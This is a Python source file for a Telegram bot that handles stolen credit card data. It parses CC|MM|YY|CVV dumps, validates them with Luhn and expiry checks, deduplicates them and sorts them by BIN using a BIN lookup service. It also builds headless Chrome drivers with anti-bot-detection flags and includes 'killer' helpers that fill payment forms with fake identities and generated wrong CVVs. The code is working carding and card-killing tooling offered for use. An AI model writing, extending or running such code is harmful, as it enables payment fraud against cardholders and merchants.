# ==== 1. Imports & Environment Setup ====
import os
import time
import random
import asyncio
import json
import platform
import traceback
import re
import requests
import string
import tempfile
import shutil
import gc
import zipfile
import sys
import collections
import logging
from typing import List, Optional, Set, Tuple, Union
from datetime import datetime
from multiprocessing import Process
from io import BytesIO, StringIO
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.error import NetworkError, RetryAfter, TimedOut
from concurrent.futures import ThreadPoolExecutor
from functools import lru_cache
import threading

import nest_asyncio
import names
import psutil

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from fake_useragent import UserAgent

# Keep library logs quiet (Railway/container)
logging.basicConfig(level=os.environ.get("LOG_LEVEL", "INFO"))
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

# ==== 1.05 Pyrogram for Large File Uploads (500MB+) ====
# Pyrogram uses MTProto API which supports up to 2GB file uploads
# To enable: set API_ID and API_HASH from https://my.telegram.org
_pyrogram_available = False
_pyrogram_lock = threading.Lock()

try:
    from pyrogram import Client as PyroClient
    from pyrogram.errors import FloodWait
    from pyrogram import enums as PyroEnums
    _pyrogram_available = True
except ImportError:
    _pyrogram_available = False
    PyroClient = None
    FloodWait = Exception  # Dummy for except clause
    PyroEnums = None


def _get_pyrogram_config():
    """Get Pyrogram configuration from environment"""
    api_id = os.environ.get("API_ID", "").strip()
    api_hash = os.environ.get("API_HASH", "").strip()
    bot_token = os.environ.get("BOT_TOKEN", "").strip()
    
    if not api_id or not api_hash or not bot_token:
        return None
    
    try:
        return {
            "api_id": int(api_id),
            "api_hash": api_hash,
            "bot_token": bot_token
        }
    except ValueError:
        print(f"⚠️ Invalid API_ID: {api_id}")
        return None


async def _upload_large_file_pyrogram(chat_id: int, file_path: str, caption: str, reply_to: int = None) -> bool:
    """
    Upload large video file using Pyrogram (supports up to 2GB).
    Creates a fresh client for each upload to avoid connection issues.
    Returns True if successful, False otherwise.
    """
    if not _pyrogram_available:
        print("⚠️ Pyrogram not available")
        return False
    
    config = _get_pyrogram_config()
    if not config:
        print("⚠️ Pyrogram config missing (API_ID, API_HASH, BOT_TOKEN)")
        return False
    
    client = None
    try:
        # Create a fresh client for this upload
        client = PyroClient(
            name=f"upload_{int(time.time())}",
            api_id=config["api_id"],
            api_hash=config["api_hash"],
            bot_token=config["bot_token"],
            workdir="/tmp",
            no_updates=True,
            in_memory=True
        )
        
        print(f"📤 Starting Pyrogram client for upload...")
        await client.start()
        print(f"✅ Pyrogram client started, uploading {file_path}...")
        
        # Upload as video with streaming support - use HTML parse mode
        await client.send_video(
            chat_id=chat_id,
            video=file_path,
            caption=caption,
            parse_mode=PyroEnums.ParseMode.HTML,
            reply_to_message_id=reply_to,
            supports_streaming=True
        )
        print(f"✅ Pyrogram upload successful!")
        return True
        
    except FloodWait as e:
        print(f"⚠️ FloodWait: waiting {e.value}s...")
        await asyncio.sleep(e.value + 1)
        try:
            if client and client.is_connected:
                await client.send_video(
                    chat_id=chat_id,
                    video=file_path,
                    caption=caption,
                    parse_mode=PyroEnums.ParseMode.HTML,
                    reply_to_message_id=reply_to,
                    supports_streaming=True
                )
                return True
        except Exception as retry_e:
            print(f"❌ Pyrogram retry failed: {retry_e}")
        return False
    except Exception as e:
        print(f"❌ Pyrogram upload error: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        if client:
            try:
                await client.stop()
                print("🔌 Pyrogram client stopped")
            except:
                pass


async def _upload_large_document_pyrogram(chat_id: int, file_path: str, filename: str, caption: str, reply_to: int = None) -> bool:
    """
    Upload large document using Pyrogram (supports up to 2GB).
    Used for large text files from sort/clean/filter commands.
    Returns True if successful, False otherwise.
    """
    if not _pyrogram_available:
        print("⚠️ Pyrogram not available for document upload")
        return False
    
    config = _get_pyrogram_config()
    if not config:
        print("⚠️ Pyrogram config missing for document upload")
        return False
    
    client = None
    try:
        # Create a fresh client for this upload
        client = PyroClient(
            name=f"doc_upload_{int(time.time())}",
            api_id=config["api_id"],
            api_hash=config["api_hash"],
            bot_token=config["bot_token"],
            workdir="/tmp",
            no_updates=True,
            in_memory=True
        )
        
        print(f"📤 Starting Pyrogram client for document upload...")
        await client.start()
        print(f"✅ Pyrogram client started, uploading document...")
        
        # Upload as document
        await client.send_document(
            chat_id=chat_id,
            document=file_path,
            caption=caption or "",
            file_name=filename,
            reply_to_message_id=reply_to
        )
        print(f"✅ Pyrogram document upload successful!")
        return True
        
    except FloodWait as e:
        print(f"⚠️ FloodWait: waiting {e.value}s...")
        await asyncio.sleep(e.value + 1)
        try:
            if client and client.is_connected:
                await client.send_document(
                    chat_id=chat_id,
                    document=file_path,
                    caption=caption or "",
                    file_name=filename,
                    reply_to_message_id=reply_to
                )
                return True
        except Exception as retry_e:
            print(f"❌ Pyrogram document retry failed: {retry_e}")
        return False
    except Exception as e:
        print(f"❌ Pyrogram document upload error: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        if client:
            try:
                await client.stop()
                print("🔌 Pyrogram client stopped")
            except:
                pass


async def download_large_file_pyrogram(file_id: str, file_size: int) -> bytes:
    """
    Download large file using Pyrogram (supports files > 20MB up to 2GB).
    Returns file bytes or None if failed.
    """
    if not _pyrogram_available:
        print("⚠️ Pyrogram not available for download")
        return None
    
    config = _get_pyrogram_config()
    if not config:
        print("⚠️ Pyrogram config missing for download")
        return None
    
    client = None
    temp_path = f"/tmp/download_{int(time.time())}_{random.randint(1000, 9999)}"
    
    try:
        # Create a fresh client for this download
        client = PyroClient(
            name=f"download_{int(time.time())}",
            api_id=config["api_id"],
            api_hash=config["api_hash"],
            bot_token=config["bot_token"],
            workdir="/tmp",
            no_updates=True,
            in_memory=True
        )
        
        print(f"📥 Starting Pyrogram client for download...")
        await client.start()
        print(f"✅ Pyrogram client started, downloading file...")
        
        # Download the file
        downloaded_path = await client.download_media(
            file_id,
            file_name=temp_path
        )
        
        if downloaded_path and os.path.exists(downloaded_path):
            print(f"✅ Pyrogram download successful: {downloaded_path}")
            with open(downloaded_path, 'rb') as f:
                file_bytes = f.read()
            
            # Clean up temp file
            try:
                os.remove(downloaded_path)
            except:
                pass
            
            return file_bytes
        else:
            print(f"❌ Pyrogram download failed - file not found")
            return None
        
    except FloodWait as e:
        print(f"⚠️ FloodWait during download: waiting {e.value}s...")
        await asyncio.sleep(e.value + 1)
        return None
    except Exception as e:
        print(f"❌ Pyrogram download error: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        return None
    finally:
        if client:
            try:
                await client.stop()
                print("🔌 Pyrogram download client stopped")
            except:
                pass
        # Clean up any temp files
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass


async def send_large_document(bot, chat_id: int, content: bytes, filename: str, caption: str, reply_to: int = None) -> bool:
    """
    Smart document sender - uses Pyrogram for large files (>45MB), standard Bot API otherwise.
    Returns True if successful, False otherwise.
    """
    file_size_mb = len(content) / (1024 * 1024)
    
    # For files > 45MB, try Pyrogram first (MTProto supports up to 2GB)
    if file_size_mb > 45 and _pyrogram_available:
        temp_path = f"/tmp/upload_{int(time.time())}_{random.randint(1000, 9999)}.txt"
        try:
            with open(temp_path, 'wb') as f:
                f.write(content)
            
            # Convert caption to HTML if needed
            html_caption = caption.replace('*', '<b>').replace('`', '<code>')
            html_caption = html_caption.replace('<b>', '<b>', 1)  # Just use first bold
            
            success = await _upload_large_document_pyrogram(
                chat_id=chat_id,
                file_path=temp_path,
                filename=filename,
                caption=caption,  # Keep as plain text for simplicity
                reply_to=reply_to
            )
            
            if success:
                try:
                    os.remove(temp_path)
                except:
                    pass
                return True
        except Exception as e:
            print(f"Pyrogram document upload failed: {e}")
        finally:
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except:
                pass
    
    # Standard Bot API upload (up to 50MB)
    if file_size_mb > 50:
        # File too large for Bot API and Pyrogram failed/unavailable
        return False
    
    try:
        with BytesIO(content) as file_buffer:
            file_buffer.name = filename
            await bot.send_document(
                chat_id=chat_id,
                document=file_buffer,
                caption=caption,
                reply_to_message_id=reply_to
            )
        return True
    except Exception as e:
        print(f"Standard document upload failed: {e}")
        return False


async def _safe_edit_text(msg, text: str, **kwargs) -> bool:
    """Safely edit message text, ignoring 'message not modified' errors"""
    try:
        await msg.edit_text(text, **kwargs)
        return True
    except Exception as e:
        if "not modified" in str(e).lower():
            return True  # Not an error, just same content
        print(f"Edit message error: {e}")
        return False


async def _tg_call_with_retry(fn, *args, retries: int = 4, base_delay: float = 1.0, **kwargs):
    """
    Best-effort retry wrapper for Telegram API calls.
    Helps with transient `telegram.error.TimedOut` and network hiccups.
    """
    last_exc: Optional[Exception] = None
    for attempt in range(retries):
        try:
            return await fn(*args, **kwargs)
        except RetryAfter as e:
            last_exc = e
            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)) + 0.5)
        except (TimedOut, NetworkError) as e:
            last_exc = e
            await asyncio.sleep(base_delay * (2**attempt))
        except Exception as e:
            # Don't hide unexpected exceptions
            raise
    if last_exc:
        raise last_exc


# ==== 1.1 Lightweight in-process log capture (for /log) ====
# Captures stdout/stderr into a ring buffer so the admin can fetch recent logs.
_LOG_MAX_LINES = int(os.environ.get("LOG_MAX_LINES", "20000"))
_log_lines = collections.deque(maxlen=max(1000, _LOG_MAX_LINES))
_log_lock = threading.Lock()


def _append_log_line(line: str) -> None:
    # Prefix timestamp for readability
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    clean = line.rstrip("\n")
    if not clean:
        return
    with _log_lock:
        _log_lines.append(f"{ts}Z {clean}\n")


class _TeeStream:
    def __init__(self, original, stream_name: str):
        self._original = original
        self._name = stream_name
        self._buf = ""

    def write(self, s):  # noqa: A003
        try:
            self._original.write(s)
        except Exception:
            pass
        try:
            txt = str(s)
        except Exception:
            txt = ""
        self._buf += txt
        while "\n" in self._buf:
            line, self._buf = self._buf.split("\n", 1)
            _append_log_line(f"[{self._name}] {line}")
        return len(txt)

    def flush(self):  # noqa: A003
        try:
            self._original.flush()
        except Exception:
            pass
        if self._buf.strip():
            _append_log_line(f"[{self._name}] {self._buf}")
        self._buf = ""


def _init_log_capture() -> None:
    if os.environ.get("DISABLE_LOG_CAPTURE", "").strip().lower() in ("1", "true", "yes"):
        return
    try:
        if not isinstance(sys.stdout, _TeeStream):
            sys.stdout = _TeeStream(sys.stdout, "stdout")
        if not isinstance(sys.stderr, _TeeStream):
            sys.stderr = _TeeStream(sys.stderr, "stderr")
    except Exception:
        pass


_init_log_capture()

# ==== 1.2 Performance & Connection Pooling ====
# Global session with connection pooling for faster HTTP requests
_http_session = None
_http_session_lock = threading.Lock()

def get_http_session():
    """Get or create a pooled HTTP session for faster requests"""
    global _http_session
    if _http_session is None:
        with _http_session_lock:
            if _http_session is None:
                _http_session = requests.Session()
                adapter = requests.adapters.HTTPAdapter(
                    pool_connections=20,
                    pool_maxsize=50,
                    max_retries=requests.adapters.Retry(
                        total=2,
                        backoff_factor=0.1,
                        status_forcelist=[500, 502, 503, 504]
                    )
                )
                _http_session.mount('http://', adapter)
                _http_session.mount('https://', adapter)
    return _http_session

# Thread pool for parallel operations
_executor = ThreadPoolExecutor(max_workers=int(os.environ.get("WORKER_THREADS", "5")))
SITE_THREADS = int(os.environ.get("SITE_THREADS", "5"))

# BIN prefetch: warm up API/file cache in the main process while Selenium runs in child processes.
_bin_prefetch_sem = asyncio.Semaphore(int(os.environ.get("BIN_PREFETCH_CONCURRENCY", "10")))


async def _prefetch_bin_async(bin6: str) -> None:
    """Best-effort BIN prefetch to populate local cache (DB3) for child processes."""
    try:
        b = (bin6 or "").strip()[:6]
        if len(b) != 6 or not b.isdigit():
            return
        async with _bin_prefetch_sem:
            loop = asyncio.get_running_loop()
            # get_bin_info persists API results into DB3 cache; children can then read quickly.
            await loop.run_in_executor(_executor, get_bin_info, b)
    except Exception:
        return

# ==== 1.3 Large File Support (100-300MB+ via URL) ====
# Telegram Bot API has a 20MB download limit. For larger files, users can:
# 1. Upload to a file host and provide the direct download URL
# 2. Use paste services (pastebin, rentry, etc.)
# 3. Use cloud storage with direct links (Dropbox, Google Drive, etc.)

# Supported URL patterns for large file downloads
_LARGE_FILE_URL_PATTERNS = [
    # Direct file hosts
    r'https?://(?:www\.)?transfer\.sh/.+',
    r'https?://(?:www\.)?file\.io/.+',
    r'https?://(?:www\.)?temp\.sh/.+',
    r'https?://(?:www\.)?0x0\.st/.+',
    r'https?://(?:www\.)?litterbox\.catbox\.moe/.+',
    r'https?://(?:www\.)?catbox\.moe/raw/.+',
    r'https?://(?:www\.)?uguu\.se/.+',
    # Paste services (raw URLs)
    r'https?://(?:www\.)?pastebin\.com/raw/.+',
    r'https?://(?:www\.)?rentry\.co/.+/raw',
    r'https?://(?:www\.)?rentry\.org/.+/raw',
    r'https?://(?:www\.)?paste\.ee/r/.+',
    r'https?://(?:www\.)?dpaste\.org/.+/raw',
    r'https?://(?:www\.)?hastebin\.com/raw/.+',
    r'https?://(?:www\.)?privatebin\..+\?.*',
    # Cloud storage (direct links)
    r'https?://(?:www\.)?dropbox\.com/.+\?.*dl=1.*',
    r'https?://(?:dl\.)?dropboxusercontent\.com/.+',
    r'https?://drive\.google\.com/uc\?.*export=download.*',
    r'https?://(?:www\.)?mediafire\.com/file/.+',
    # GitHub raw files
    r'https?://raw\.githubusercontent\.com/.+',
    r'https?://gist\.githubusercontent\.com/.+',
    # Generic direct file URLs
    r'https?://.+\.txt(?:\?.*)?$',
    r'https?://.+\.csv(?:\?.*)?$',
    r'https?://.+\.json(?:\?.*)?$',
]

# Max file size for URL downloads (500MB)
MAX_URL_FILE_SIZE = int(os.environ.get("MAX_URL_FILE_SIZE_MB", "500")) * 1024 * 1024

def is_valid_file_url(text: str) -> bool:
    """Check if text looks like a valid file download URL"""
    if not text:
        return False
    text = text.strip()
    if not text.startswith(('http://', 'https://')):
        return False
    for pattern in _LARGE_FILE_URL_PATTERNS:
        if re.match(pattern, text, re.IGNORECASE):
            return True
    # Also accept any URL ending in common text file extensions
    if re.match(r'https?://.+\.(txt|csv|json|log|dat)(\?.*)?$', text, re.IGNORECASE):
        return True
    return False

def _convert_to_direct_url(url: str) -> str:
    """Convert sharing URLs to direct download URLs where possible"""
    url = url.strip()
    
    # Google Drive: convert sharing link to direct download
    gdrive_match = re.match(r'https?://drive\.google\.com/file/d/([^/]+)', url)
    if gdrive_match:
        file_id = gdrive_match.group(1)
        return f"https://drive.google.com/uc?export=download&id={file_id}"
    
    # Dropbox: ensure dl=1 parameter
    if 'dropbox.com' in url and 'dl=0' in url:
        url = url.replace('dl=0', 'dl=1')
    elif 'dropbox.com' in url and 'dl=' not in url:
        url = url + ('&' if '?' in url else '?') + 'dl=1'
    
    # Pastebin: convert to raw URL
    pastebin_match = re.match(r'https?://(?:www\.)?pastebin\.com/([a-zA-Z0-9]+)$', url)
    if pastebin_match:
        paste_id = pastebin_match.group(1)
        return f"https://pastebin.com/raw/{paste_id}"
    
    # Rentry: convert to raw URL
    rentry_match = re.match(r'https?://(?:www\.)?(rentry\.(?:co|org))/([^/]+)$', url)
    if rentry_match:
        domain = rentry_match.group(1)
        paste_id = rentry_match.group(2)
        return f"https://{domain}/{paste_id}/raw"
    
    return url

async def download_large_file_from_url(url: str, progress_callback=None) -> tuple:
    """
    Download large file from URL with streaming.
    Returns: (content_str, file_size_mb, error_msg)
    
    Supports files up to MAX_URL_FILE_SIZE (default 500MB).
    Uses streaming to minimize memory usage during download.
    """
    url = _convert_to_direct_url(url)
    
    try:
        session = get_http_session()
        
        # First, check file size with HEAD request
        try:
            head_resp = session.head(url, timeout=10, allow_redirects=True)
            content_length = int(head_resp.headers.get('content-length', 0))
            if content_length > MAX_URL_FILE_SIZE:
                return None, 0, f"File too large: {content_length / (1024*1024):.1f}MB (max: {MAX_URL_FILE_SIZE / (1024*1024):.0f}MB)"
        except:
            content_length = 0  # Unknown size, proceed anyway
        
        # Stream download
        downloaded = 0
        chunks = []
        
        with session.get(url, stream=True, timeout=300) as resp:
            resp.raise_for_status()
            
            # Check content type - should be text
            content_type = resp.headers.get('content-type', '')
            if 'html' in content_type.lower() and 'text/plain' not in content_type.lower():
                # Might be a login page or error page - still try to parse
                pass
            
            for chunk in resp.iter_content(chunk_size=1024 * 1024):  # 1MB chunks
                if chunk:
                    chunks.append(chunk)
                    downloaded += len(chunk)
                    
                    if downloaded > MAX_URL_FILE_SIZE:
                        return None, 0, f"File exceeds max size during download"
                    
                    if progress_callback and content_length > 0:
                        progress = (downloaded / content_length) * 100
                        await progress_callback(progress, downloaded / (1024*1024))
        
        # Combine chunks and decode
        file_bytes = b''.join(chunks)
        file_size_mb = len(file_bytes) / (1024 * 1024)
        
        # Try different encodings
        for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
            try:
                content = file_bytes.decode(encoding)
                return content, file_size_mb, None
            except UnicodeDecodeError:
                continue
        
        # Last resort: ignore errors
        content = file_bytes.decode('utf-8', errors='ignore')
        return content, file_size_mb, None
        
    except requests.exceptions.Timeout:
        return None, 0, "Download timed out (max 5 minutes)"
    except requests.exceptions.HTTPError as e:
        return None, 0, f"HTTP error: {e.response.status_code}"
    except Exception as e:
        return None, 0, f"Download failed: {str(e)[:100]}"

def extract_cards_streaming(data_text: str, chunk_size: int = 2 * 1024 * 1024) -> tuple:
    """
    Memory-efficient streaming card extraction for very large files (100MB+).
    Processes data in chunks to minimize peak memory usage.
    
    Returns: (valid_cards_list, stats_dict)
    """
    if not data_text:
        return [], {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 'expired': 0}
    
    # Pre-compile pattern once
    pattern = re.compile(r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})')
    
    seen = set()
    valid_cards = []
    stats = {'total_raw': 0, 'valid': 0, 'junk': 0, 'duplicates': 0, 'expired': 0}
    
    now_year = datetime.now().year
    now_month = datetime.now().month
    
    text_len = len(data_text)
    pos = 0
    overlap = 100  # Overlap to catch cards split across chunks
    
    while pos < text_len:
        # Get chunk with overlap
        end = min(pos + chunk_size, text_len)
        
        # Extend to next newline if possible (avoid splitting cards)
        if end < text_len:
            newline_pos = data_text.find('\n', end)
            if newline_pos != -1 and newline_pos < end + 500:
                end = newline_pos + 1
        
        chunk = data_text[pos:end]
        
        for match in pattern.finditer(chunk):
            stats['total_raw'] += 1
            cc, mm, yy, cvv = match.groups()
            
            # Normalize month
            mm = mm.zfill(2)
            try:
                month_int = int(mm)
                if not (1 <= month_int <= 12):
                    stats['junk'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            # Normalize year
            yy = yy[-2:] if len(yy) == 4 else yy.zfill(2)
            
            # CVV check
            if len(cvv) < 3:
                stats['junk'] += 1
                continue
            
            # Inline Luhn check (fastest)
            try:
                total = 0
                for i, c in enumerate(reversed(cc)):
                    d = int(c)
                    if i % 2 == 1:
                        d *= 2
                        if d > 9:
                            d -= 9
                    total += d
                if total % 10 != 0:
                    stats['junk'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            # Expiry check
            try:
                year = 2000 + int(yy)
                if year < now_year or (year == now_year and month_int < now_month):
                    stats['expired'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            # Deduplicate
            key = f"{cc}|{mm}|{yy}|{cvv}"
            if key in seen:
                stats['duplicates'] += 1
                continue
            seen.add(key)
            
            valid_cards.append(key)
        
        # Move position, accounting for overlap
        if end >= text_len:
            break
        pos = end - overlap if end > overlap else end
    
    stats['valid'] = len(valid_cards)
    
    # Sort by BIN for consistency
    valid_cards.sort(key=lambda x: x[:6])
    
    return valid_cards, stats

def organize_cards_from_list(cards_list: list) -> dict:
    """
    Organize a list of formatted cards (CC|MM|YY|CVV) into categories.
    Memory-efficient: uses the same card strings, just references.
    """
    organized = {
        'all': [],
        'by_bin': {},
        'by_month': {},
        'by_year': {},
        'by_year_month': {},
        'by_brand': {},
        'by_type': {},
        'by_level': {},
        'by_country': {},
        'by_bank': {},
        '_bin_info_loaded': False
    }
    
    for card_str in cards_list:
        parts = card_str.split('|')
        if len(parts) != 4:
            continue
        
        cc, mm, yy, cvv = parts
        bin_num = cc[:6]
        full_year = 2000 + int(yy)
        
        card_data = {
            'card': cc,
            'mm': mm,
            'yy': yy,
            'cvv': cvv,
            'formatted': card_str,
            'bin': bin_num,
            'full_year': full_year
        }
        
        organized['all'].append(card_data)
        
        # By BIN
        if bin_num not in organized['by_bin']:
            organized['by_bin'][bin_num] = []
        organized['by_bin'][bin_num].append(card_data)
        
        # By month
        if mm not in organized['by_month']:
            organized['by_month'][mm] = []
        organized['by_month'][mm].append(card_data)
        
        # By year
        if yy not in organized['by_year']:
            organized['by_year'][yy] = []
        organized['by_year'][yy].append(card_data)
        
        # By year+month
        if full_year not in organized['by_year_month']:
            organized['by_year_month'][full_year] = {}
        if mm not in organized['by_year_month'][full_year]:
            organized['by_year_month'][full_year][mm] = []
        organized['by_year_month'][full_year][mm].append(card_data)
    
    return organized

# ==== 2. Global Configs ====
CHROME_PATH = "/usr/bin/google-chrome"
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
BOT_TOKEN = os.environ.get("BOT_TOKEN") or ""
APP_VERSION = os.environ.get("APP_VERSION") or os.environ.get("BOT_VERSION") or "dev"

# Railway Pro optimizations
MAX_CONCURRENT_BROWSERS = int(os.environ.get("MAX_BROWSERS", "5"))
BROWSER_TIMEOUT = int(os.environ.get("BROWSER_TIMEOUT", "30"))

def get_optimized_chrome_options(fast_mode=False):
    """Get optimized Chrome options for Railway/container environments"""
    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    
    # Essential headless options
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    # Memory optimization for Railway containers
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument("--disable-images")  # Faster loading
    options.add_argument("--disable-javascript-harmony-shipping")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-breakpad")
    options.add_argument("--disable-component-extensions-with-background-pages")
    options.add_argument("--disable-component-update")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-hang-monitor")
    options.add_argument("--disable-ipc-flooding-protection")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-prompt-on-repost")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--no-first-run")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--password-store=basic")
    options.add_argument("--use-mock-keychain")
    
    # Window size
    options.add_argument("--window-size=1920,1080")
    
    # Anti-detection
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    # Fast mode optimizations
    if fast_mode:
        options.set_capability("pageLoadStrategy", "eager")
        options.add_argument("--blink-settings=imagesEnabled=false")
    
    return options

# Browser semaphore to limit concurrent browser instances
_browser_semaphore = threading.Semaphore(MAX_CONCURRENT_BROWSERS)


def _env_int(name: str, default: int) -> int:
    raw = os.environ.get(name)
    if raw is None or str(raw).strip() == "":
        return default
    try:
        return int(str(raw).strip())
    except Exception:
        print(f"⚠️ Invalid {name}={raw!r}; using default {default}")
        return default


BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

nest_asyncio.apply()
start_time = datetime.now()

# ==== 2.1 Memory Management for Railway ====
_last_gc_time = time.time()
_gc_interval = 300  # Run GC every 5 minutes

def periodic_cleanup():
    """Periodic memory cleanup for long-running Railway deployments"""
    global _last_gc_time
    current_time = time.time()
    if current_time - _last_gc_time > _gc_interval:
        gc.collect()
        _last_gc_time = current_time
        return True
    return False

def force_cleanup():
    """Force garbage collection after heavy operations"""
    gc.collect()
    
def safe_driver_quit(driver):
    """Safely quit driver with cleanup"""
    if driver:
        try:
            driver.quit()
        except Exception:
            pass
        finally:
            # Help garbage collector
            driver = None
            periodic_cleanup()

# ==== 2.2 Shared Killer Process Utilities ====
# Pre-computed constants for faster process startup
_KILLER_CHROME_ARGS = [
    "--headless=new",
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-extensions",
    "--disable-software-rasterizer",
    "--disable-background-networking",
    "--disable-default-apps",
    "--disable-sync",
    "--disable-translate",
    "--disable-hang-monitor",
    "--disable-popup-blocking",
    "--disable-prompt-on-repost",
    "--disable-notifications",
    "--disable-background-timer-throttling",
    "--disable-renderer-backgrounding",
    "--disable-backgrounding-occluded-windows",
    "--disable-ipc-flooding-protection",
    "--disable-component-update",
    "--no-first-run",
    "--window-size=1920,1080",
    "--disable-blink-features=AutomationControlled",
]

_FAKE_FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
_FAKE_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
_FAKE_ADDRESSES = [
    ("123 Elm Street", "New York", "NY", "10001"),
    ("456 Oak Avenue", "Los Angeles", "CA", "90001"),
    ("789 Pine Road", "Chicago", "IL", "60601"),
    ("321 Maple Drive", "Houston", "TX", "77001"),
    ("654 Cedar Lane", "Phoenix", "AZ", "85001"),
]

# BIN cache for processes (shared via file for multiprocessing)
_process_bin_cache = {}
_process_bin_cache_lock = threading.Lock()

def get_cached_bin_info(bin_number: str) -> tuple:
    """Get BIN info with in-memory caching for processes"""
    global _process_bin_cache
    
    if bin_number in _process_bin_cache:
        return _process_bin_cache[bin_number]
    
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
        if res.status_code == 200:
            data = res.json()
            brand = data.get("brand", "Unknown").upper()
            type_ = data.get("type", "Unknown").upper()
            country = data.get("country_name", "Unknown")
            country_code = data.get("country", "") or data.get("country_code", "")
            
            # Generate flag
            flag = ""
            if country_code and len(country_code) == 2:
                try:
                    flag = "".join(chr(ord(c) + 127397) for c in country_code.upper())
                except:
                    flag = data.get("country_flag", "")
            else:
                flag = data.get("country_flag", "")
            
            bank = data.get("bank", "Unknown")
            level = data.get("level", "")
            
            info_parts = [brand]
            if type_ and type_ != "UNKNOWN":
                info_parts.append(type_)
            if country and country != "Unknown":
                info_parts.append(country)
            if level:
                info_parts.append(level)
            if bank and bank != "Unknown":
                info_parts.append(bank)
            
            result = (" • ".join(info_parts), flag)
            
            with _process_bin_cache_lock:
                if len(_process_bin_cache) < 1000:  # Limit cache size
                    _process_bin_cache[bin_number] = result
            
            return result
    except:
        pass
    
    return ("Unavailable", "")

def create_killer_driver():
    """Create optimized Chrome driver for killer commands - consistent across all uses"""
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from fake_useragent import UserAgent
    
    options = webdriver.ChromeOptions()
    options.binary_location = "/usr/bin/google-chrome"
    
    try:
        ua = UserAgent(fallback="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").random
    except:
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    options.add_argument(f"user-agent={ua}")
    
    for arg in _KILLER_CHROME_ARGS:
        options.add_argument(arg)
    
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.set_capability("pageLoadStrategy", "eager")
    
    service = Service(executable_path="/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(25)
    
    return driver

def killer_split_card(card_input: str) -> tuple:
    """Split card input into components"""
    parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
    if len(parts) != 4:
        raise ValueError("Invalid card format")
    return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

def killer_get_fake_identity() -> dict:
    """Get random fake identity for forms"""
    import random
    first = random.choice(_FAKE_FIRST_NAMES)
    last = random.choice(_FAKE_LAST_NAMES)
    addr = random.choice(_FAKE_ADDRESSES)
    phone = "202555" + ''.join(random.choices('0123456789', k=4))
    email = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)) + "@gmail.com"
    
    return {
        "first_name": first,
        "last_name": last,
        "address": addr[0],
        "city": addr[1],
        "state": addr[2],
        "zip": addr[3],
        "phone": phone,
        "email": email
    }

def killer_get_wrong_cvv(exclude: str) -> str:
    """Generate a random CVV that's not the real one"""
    import random
    while True:
        fake = ''.join(random.choices('0123456789', k=len(exclude)))
        if fake != exclude:
            return fake

def killer_edit_message(update_dict: dict, text: str):
    """Edit telegram message - optimized with timeout"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{os.environ.get('BOT_TOKEN', '')}/editMessageText",
            data={
                "chat_id": update_dict["chat_id"],
                "message_id": update_dict["message_id"],
                "text": text,
                "parse_mode": "Markdown"
            },
            timeout=5
        )
    except:
        pass

